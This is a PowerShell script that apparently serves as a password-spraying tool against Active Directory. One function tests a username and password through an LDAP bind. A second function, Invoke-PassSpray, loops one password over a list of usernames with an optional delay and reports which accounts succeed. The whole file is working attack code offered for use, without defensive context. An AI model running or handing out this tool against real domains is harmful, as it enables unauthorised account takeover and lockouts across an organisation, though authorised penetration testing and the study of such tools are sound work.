Function Test-ADAuthentication {
	Param(
		[Parameter(Mandatory=$true)]
		[String]$domain,
		[Parameter(Mandatory=$true)]
		[String]$username,
		[Parameter(Mandatory=$true)]
		[String]$password,
		[String]$server
	)

	# Check credentials
	if (!$server) {
		$dom = New-Object System.DirectoryServices.DirectoryEntry("", "$domain\$username", $password)
	} else {
		$domdc = $server.Split(".")[1,-1] -join ",dc="
		$domdc = ",dc=$domdc"

		$dom = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$server/cn=sites,cn=configuration$domdc", "$domain\$username", $password)
	}
	$res = $dom.Name

	# Return true/false
	If ($res -eq $null) {Return $false}
	Else {Return $true}
}

Function Invoke-PassSpray {
	param(
		[String]$domain,
		[String]$username,
		[String]$userfile,
		[Parameter(Mandatory=$true)]
		[String]$password,
		[String]$server, # Must be FQDN, not an IP
		[Double]$delay
	)

	if (!$domain) {
		$domain = $env:USERDOMAIN
	}
	Write-Verbose "Domain for authentication: $domain"

	if (!$username) {
		if (!$userfile) {
			throw "'username' or 'userfile' must be supplied."
		} else {
			$userlist = @()
			$numusers = 0

			foreach($line in Get-Content $userfile) {
				$userlist += @($line)
				$numusers += 1
			}

			Write-Verbose "Loaded $numusers usernames to target"
		}
	}

	if (!$username) {
		foreach($user in $userlist) {
			if (!$server) {
				$result = Test-ADAuthentication $domain $user $password
			} else {
				$result = Test-ADAuthentication $domain $user $password $server
			}

			if ($result -eq $TRUE) {
				Write-Output "[SUCCESS] $domain\$user : $password"
				Write-Verbose "[SUCCESS] $domain\$user : $password"
			} else {
				Write-Output "[FAILED] $domain\$user : $password"
			}

			if ($delay) {
				Start-Sleep -Seconds $delay
			}
		}
	} else {
		if (!$server) {
			$result = Test-ADAuthentication $domain $username $password
		} else {
			$result = Test-ADAuthentication $domain $username $password $server
		}

		if ($result -eq $TRUE) {
			Write-Output "[SUCCESS] $domain\$username : $password"
			Write-Verbose "[SUCCESS] $domain\$username : $password"
		} else {
			Write-Output "[FAILED] $domain\$username : $password"
		}
	}

	Write-Verbose "Password guessing completed"
}
